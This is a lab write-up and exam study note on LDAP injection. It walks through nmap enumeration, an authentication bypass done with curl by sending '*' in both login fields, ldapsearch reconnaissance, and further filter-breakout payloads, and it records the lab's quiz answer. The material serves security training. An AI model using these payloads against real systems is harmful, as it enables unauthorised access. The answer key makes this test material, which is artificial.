# Section 26 — LDAP (Injection / Auth Bypass)

**LDAP** = Lightweight Directory Access Protocol — a protocol for querying/managing a hierarchical directory (users, groups, computers). Ports **389** (cleartext / StartTLS) and **636** (LDAPS). Two big implementations: **OpenLDAP** (cross-platform) and **Active Directory** (Microsoft; uses LDAP as one of its protocols + Kerberos/DNS).

> **LDAP ≠ AD.** LDAP is the *protocol*; AD is a *directory service* that speaks LDAP. The exam likes this distinction.

**LDAP injection:** web apps that build an LDAP search filter from raw user input are injectable, exactly like SQLi but against the directory. The filter language uses `*` (wildcard), `( )` (grouping), `&` (AND), `|` (OR).

Typical vulnerable auth filter:
```
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```
> If `$username` / `$password` aren't sanitised, injecting `*` makes a clause match **any** value. `username=*` → matches any account; `password=*` → matches any password. Supply `*` to **both** and the whole `&` filter evaluates true for the first directory entry → authentication bypassed with **no valid credentials**.

---

## Step 1 — Enumeration

```bash
nmap -p- -sC -sV --open --min-rate=1000 10.129.205.18
```
Verified output (SLAP):
```
80/tcp  open  http  Apache httpd 2.4.41 ((Ubuntu))   |_http-title: Login
389/tcp open  ldap  OpenLDAP
```
> `-p-` all ports, `-sV` versions, `--min-rate=1000` speeds the all-port sweep. The combo **HTTP login page + open LDAP/389** is the tell: the web app almost certainly authenticates against that LDAP directory → test for LDAP injection on the login form.

Inspect the login form:
```bash
curl -s -i http://10.129.205.18/ | grep -iE "<form|name=|method="
```
Verified:
```
<form ... method="post">
<input type="text"     name="username">
<input type="password" name="password">
```
> No `action=` → the form POSTs back to `/`. Field names `username` / `password`. That's everything needed to craft the injection request.

---

## Step 2 — LDAP injection auth bypass

```bash
curl -s -i -L -c /tmp/cj -b /tmp/cj \
  --data-urlencode "username=*" \
  --data-urlencode "password=*" \
  http://10.129.205.18/
```
✅ **Verified result:**
```
HTTP/1.1 302 Found
Location: upload.php
HTTP/1.1 200 OK
<title>File Upload</title>
...
<p>Powered by <a href="https://www.w3schools.com/w3css/default.asp">w3.css</a></p>
```
> `--data-urlencode` POSTs the fields safely (the `*` is sent literally). `-c/-b` keep the session cookie, `-L` follows the redirect. `username=*` + `password=*` collapses `(&(...)(sAMAccountName=*)(userPassword=*))` to "match the first entry, any password" → the app issues a session and **302-redirects to `upload.php`** (a logged-in File Upload page). Auth bypassed with zero credentials.

---

## ✅ Answer

**§26 Q1 — "After bypassing the login, what is the website 'Powered by'?" → `w3.css`**

> Runtime value → verified by actually performing the bypass against `10.129.205.18` and reading the post-login footer (`Powered by w3.css`), not recalled (the §22 rule).

---

## Bonus — `ldapsearch` (direct directory queries)

If you have/guess a bind DN, query LDAP directly instead of through the app:
```bash
ldapsearch -H ldap://10.129.205.18:389 -x -s base namingcontexts          # anon: find base DN
ldapsearch -H ldap://10.129.205.18:389 -x -b "dc=example,dc=com" "(objectClass=*)"
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" \
           -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
```
> `-x` simple bind, `-D` bind DN, `-w` bind password, `-b` search base, last arg = filter. `-s base namingcontexts` against the RootDSE anonymously often leaks the directory's base DN — start there when you don't know the tree. Anonymous bind being allowed is itself a finding.

---

## Exam Notes

- **HTTP login + open 389/636** ⇒ test the login form for LDAP injection before anything else.
- **Auth bypass payload: `*` in BOTH username and password.** Also try `*)(uid=*))(|(uid=*` style filter-breakouts and `admin)(&)` if a bare `*` is filtered.
- **`*`=wildcard, `( )`=group, `&`=AND, `|`=OR** — know the filter operators; injection = closing/extending the filter just like SQLi.
- **LDAP vs AD:** LDAP is the protocol, AD is a directory service that uses it. Don't conflate.
- **Anonymous `ldapsearch` to RootDSE** (`-s base namingcontexts`) leaks the base DN — free recon.
- LDAP is **cleartext by default** (389) — creds/queries sniffable unless LDAPS/StartTLS.
- Fuzzing lists: `~/SecLists/Fuzzing/LDAP.Fuzzing.txt`.

---

## Lab Walkthrough (quick steps)

```
1. nmap -p- -sC -sV --open <ip>     -> 80 (Apache, "Login") + 389 (OpenLDAP)
2. curl / -> form POSTs to '/', fields username & password
3. curl --data-urlencode username=* --data-urlencode password=*  http://<ip>/
4. -> 302 Location: upload.php  ->  File Upload page
5. footer: "Powered by w3.css"   ✅  = §26 Q1 answer (verified live)
```

> The whole bug in one line: app builds an LDAP filter from raw input → `*`/`*` makes every clause match → logged in. Next on SLAP: abuse `upload.php` (the page the bypass lands on) for a file-upload → RCE.
